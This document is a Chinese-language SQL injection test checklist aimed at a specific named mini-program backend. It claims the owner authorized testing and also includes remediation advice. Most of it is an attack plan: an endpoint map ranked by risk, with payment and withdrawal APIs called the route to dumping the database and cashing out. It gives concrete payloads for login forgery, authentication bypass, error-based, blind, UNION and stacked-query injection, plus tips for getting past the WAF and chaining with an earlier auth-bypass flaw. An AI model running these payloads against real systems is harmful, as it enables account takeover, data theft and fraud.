# SQL 注入测试清单 —— publisher 端（小程序）

> 适用对象：AutoLak Cloud 小程序后端 `https://atpsv.autolak.in/client`  
> 目的：系统化排查 publisher 端各接口是否存在 SQL 注入  
> 原则：本人未推广项目，在推广前进行安全确认。官方**测试靶场，已授权攻击测试行为**

---

## 0. 测试前准备

| # | 事项         | 说明                                                                                                   |
| - | ---------- | ---------------------------------------------------------------------------------------------------- |
| 1 | 授权确认       | 由系统所有者书面授权，记录时间窗口                                                                                    |
| 2 | 测试环境       | 优先测试环境；生产环境避开高峰并备份                                                                                   |
| 3 | 认证准备       | 准备两个真实账号 A、B 的 token + tgUserId                                                                      |
| 4 | **WAF 提示** | 该后端有 WAF（直连默认 UA 会 403，须带 Chrome UA + Origin/Referer），payload 可能被 WAF 拦截——需先确认 WAF 规则，必要时测试环境临时关 WAF |
| 5 | 工具         | Burp Suite / sqlmap / curl                                                                           |

---

## 1. 目标与范围

**后端基址**：`https://atpsv.autolak.in/client`

**认证方式**（已知）：

- 登录 `POST /user/publishTelegramAuth`，body `{ tgUserId, tgFirstName, tgLastName, userName }`
- 请求头：`Authorization: token` + `Identifier` + `userType: publisher` + `tgUserId/tgFirstName/tgLastName/userName`
- 响应格式：`{ code, msg, data, success }`；`code===10004` 未登录

**技术栈（待 owner 确认）**：前端 React（已确认），后端语言未知——但 token 为 32 字节随机、响应格式 `code/msg/data` 偏 Java 风格。若为 Java，重点排查 MyBatis `${}` 与 JDBC Statement 拼接。

---

## 2. 注入点地图（按风险排序）

> 注意区分**参数类型**：数字型（无需引号闭合）、字符串型（需 `'` 闭合）、GET query 型（在 URL 里）。

| 优先级   | 接口                                                             | 方法      | 可注入参数                                                     | 参数类型     |
| ----- | -------------------------------------------------------------- | ------- | --------------------------------------------------------- | -------- |
| 🔴 P0 | `/user/publishTelegramAuth`                                    | POST    | `tgUserId`（**数字型**）、`userName`、`tgFirstName`              | 数字 / 字符串 |
| 🔴 P0 | `/publish/save/withdraw/account`                               | POST    | 提现账户字段（地址/姓名/账号）                                          | 字符串      |
| 🔴 P0 | `/payment/init`、`/usdtPay/createOrderByLegal`、`/withdraw/init` | POST    | 金额、订单号、支付方式                                               | 数字 / 字符串 |
| 🔴 P0 | `/user/sendSmsCode`                                            | POST    | 手机号                                                       | 字符串      |
| 🟠 P1 | `/publish/searchTaskRecord`                                    | POST    | `taskId`、`status`、`startTime`、`endTime`、`page`、`pageSize` | 数字 / 字符串 |
| 🟠 P1 | `/publish/searchTaskStatistic`                                 | POST    | 时间范围、`taskId`                                             | 数字 / 字符串 |
| 🟠 P1 | `/publish/history/flow`、`/publish/recharge/withdraw/flow`      | POST    | 时间范围、订单号、流水类型                                             | 数字 / 字符串 |
| 🟠 P1 | `/activity/searchBonusPage`、`/searchBonusFlowPage`             | POST    | 分页、时间、活动名                                                 | 数字 / 字符串 |
| 🟡 P2 | `/publish/sendTask`                                            | POST    | `youtubeLink`、`keyWords`、`channelName`、`type`、`plantForm` | 字符串 / 数字 |
| 🟡 P2 | `/publish/checkTaskPublishTime`                                | **GET** | `videoLink`（**URL query**）                                | 字符串      |
| 🟡 P2 | `/usdtPay/cancelOrder`                                         | POST    | 订单号                                                       | 字符串      |
| 🟢 P3 | `/dataBoard/search*`                                           | POST    | 时间范围、频道/视频名                                               | 字符串      |
| 🟢 P3 | `/execute/insertTrackEvent`                                    | POST    | 埋点字段                                                      | 字符串      |

**重点提醒**：

- `tgUserId` 是**数字型**，注入不需要引号，直接 `8196195827 or 1=1` 这种，最容易中招也最容易被忽略。
- `checkTaskPublishTime` 是 **GET 参数**（在 URL 里），比 POST body 更容易漏测。
- 时间范围参数（`startTime`/`endTime`）如果是 `WHERE create_time >= '{startTime}'` 字符串拼接，`'` 闭合即可注入。

---

## 3. 测试方法

### 3.1 数字型注入（`tgUserId` 优先）

**目标**：`publishTelegramAuth` 的 `tgUserId` 是否被拼进 `WHERE tg_user_id = {id}`。

**步骤**：

1. 基线：正常传 `tgUserId=8196195827`，记录返回（拿到 token）。
2. 依次提交：

```text
8196195827 and 1=1
8196195827 and 1=2
8196195827 or 1=1
8196195827 union select 1,2,3,4,5
8196195827; select sleep(5)
8196195827 order by 10
```

1. **判定**：
   - `or 1=1` 若返回**第一个用户**的 token → 可伪造任意账号登录（等于之前的认证绕过 + 可枚举账号）。
   - `and 1=1` 与 `and 1=2` 响应有差异 → 布尔盲注。
   - 触发 SQL 报错 → 报错注入。
   - `order by 10` 报错而 `order by 5` 不报错 → 可 UNION。

### 3.2 登录绕过（字符串型 userName/tgFirstName）

对 `userName`、`tgFirstName`、`tgLastName` 提交：

```text
admin' --
' or '1'='1' --
xxx' or 1=1 --
```

判定：能返回他人 token / 成功 → 认证绕过注入。

### 3.3 报错注入（资金接口优先）

对 `payment/init` 金额、`withdraw/init` 金额、订单号、提现账户字段，先试单引号 `'`、双引号 `"`、反斜杠 `\`，再试报错函数：

```text
MySQL:      ' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- -
SQL Server: ' and 1=convert(int,(select @@version))-- -
PostgreSQL: ' and 1=cast((select version()) as int)-- -
```

判定：回显 `database()` / `@@version` / `version()` 结果 → 可拖库。

### 3.4 布尔 / 时间盲注

```text
布尔： test' and 1=1 --  vs  test' and 1=2 --
时间： test' and sleep(5)-- -  /  test' waitfor delay '0:0:5'-- -  /  test' and 1=pg_sleep(5)-- -
```

### 3.5 联合查询（搜索/列表接口）

对 `searchTaskRecord` 的 `taskId`/`status`、`searchBonusPage` 等回显型接口：

```text
1' order by 5-- -          ← 猜列数
1' union select 1,2,3,4,5-- -   ← 定位回显位，替换成 database()/version()/表名
```

### 3.6 GET 参数注入（`checkTaskPublishTime`）

`videoLink` 在 URL query 里，直接改 URL 测试：

```text
GET /publish/checkTaskPublishTime?videoLink=https://youtu.be/x' and sleep(5)-- -
GET /publish/checkTaskPublishTime?videoLink=https://youtu.be/x' union select ...-- -
```

### 3.7 堆叠注入（写操作接口）

对 `save/withdraw/account`、`sendTask`、订单类写接口试：

```text
test'; update xxx set yyy=zzz-- -
test'; insert into ...-- -
```

判定：第二条语句生效 → 严重，可直接改数据/插账号。

---

## 4. 判定标准汇总

| 现象                           | 结论                   |
| ---------------------------- | -------------------- |
| `tgUserId or 1=1` 返回他人 token | 数字型注入 + 可伪造身份（最高危）   |
| 登录字段绕过返回 token               | 认证绕过注入               |
| 回显数据库名/版本/表名                 | 报错/联合注入，可拖库          |
| 1=1 / 1=2 响应差异               | 布尔盲注                 |
| 响应延迟 5s                      | 时间盲注                 |
| 第二条 SQL 生效                   | 堆叠注入                 |
| WAF 拦截（403/拦截页）              | 存在 WAF，需绕过或测试环境关 WAF |

---

## 5. 报告模板

```
接口：/user/publishTelegramAuth
参数：tgUserId（数字型）
注入类型：□数字型 □认证绕过 □报错 □布尔 □时间 □UNION □堆叠
Payload：
响应（code + data + body 片段）：
是否中招：是/否
数据库类型：MySQL/SQLServer/Oracle/PG/未知
影响：能否伪造任意账号 token？能否读其他表？
WAF 是否拦截：
截图/复现步骤：
```

---

## 6. 防御建议（修复优先级）

| 优先级   | 措施                                       | 说明                                                |
| ----- | ---------------------------------------- | ------------------------------------------------- |
| 🔴 P0 | 全部 SQL 参数化                               | JDBC `PreparedStatement` / MyBatis `#{}`（禁 `${}`） |
| 🔴 P0 | `tgUserId` 必须服务端从 token 反查               | 不信任请求头/body 里的数字（配合之前的认证绕过修复）                     |
| 🟠 P1 | `order by / group by / limit / 表名列名` 白名单 | 这些位置无法参数化                                         |
| 🟠 P1 | 金额/订单号服务端生成校验                            | 金额字段不信任客户端                                        |
| 🟠 P1 | 关闭数据库报错回显                                | 生产不返回 SQL 错误详情                                    |
| 🟡 P2 | 数据库账号最小权限                                | 只给 CRUD，不给 DDL/DROP                               |
| 🟡 P2 | WAF 保持开启并补充规则                            | 作纵深防御，不能替代参数化                                     |

---

## 7. 特殊注意点（publisher 端特有）

1. **`tgUserId` 是数字型**：这是 publisher 端最隐蔽的注入点，配合之前发现的「认证只认 tgUserId」漏洞，一旦可注入等于**可枚举并伪造任意账号登录**。
2. **GET 参数 `videoLink`**：URL query 型注入最容易漏测，且常被 WAF 规则忽略。
3. **WAF 会干扰测试**：payload 可能被 WAF 拦成 403，别把「WAF 拦截」误判成「无注入」，需在测试环境确认。
4. **资金接口（payment/init、withdraw/init、usdtPay/*）是拖库+提现的直接通道**：注入成功后影响最大，务必优先测。

---

## 8. 结论一句话

publisher 端最高危注入点是 **`/user/publishTelegramAuth` 的数字型 `tgUserId`**——若可注入，则与已知的「认证绕过」漏洞叠加，能**枚举并伪造任意账号**。建议按 P0→P3 顺序逐项验证，修复以「参数化查询 + 服务端反查身份」为核心。
